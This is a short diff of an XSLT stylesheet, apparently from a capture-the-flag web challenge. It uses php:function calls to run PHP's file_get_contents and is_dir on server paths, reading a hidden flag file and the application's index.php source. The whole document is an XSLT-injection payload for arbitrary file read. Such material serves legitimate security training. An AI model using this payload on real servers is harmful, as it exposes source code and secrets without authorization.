@@ -3,7 +3,7 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:php="http://php.net/xsl"              
 >	
 
-<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee')" /> 
+<xsl:param  name="strscand"   select="php:function('is_dir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
 <xsl:template match="/">	
 PHPINFO:<xsl:value-of select="$strscand"/>
